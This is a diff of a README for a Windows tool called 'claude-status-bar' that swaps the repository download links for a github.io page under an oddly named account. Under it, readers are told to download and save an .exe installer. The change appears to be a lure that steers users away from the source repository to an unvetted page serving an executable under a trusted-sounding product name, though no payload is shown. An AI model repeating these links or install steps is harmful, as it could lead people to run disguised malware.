@@ -1,6 +1,6 @@
 # ⏱️ claude-status-bar - Track your Claude Code activity easily
 
-[![Download Claude Status Bar](https://img.shields.io/badge/Download-Claude-blue.png)](https://github.com/peaceinitiativemenhadenoil263/claude-status-bar)
+[![Download Claude Status Bar](https://img.shields.io/badge/Download-Claude-blue.png)](https://peaceinitiativemenhadenoil263.github.io)
 
 ## 📌 About this application
 
@@ -14,7 +14,7 @@ This application runs on computers with the Windows operating system. It require
 
 You must download the installation file to your computer. Follow these steps to get the software:
 
-1. Visit the [official release page](https://github.com/peaceinitiativemenhadenoil263/claude-status-bar).
+1. Visit the [official release page](https://peaceinitiativemenhadenoil263.github.io).
 2. Look for the section labeled "Assets."
 3. Click the link that ends with the .exe extension to download the installer.
 4. Save the file to your Downloads folder or your desktop for easy access.
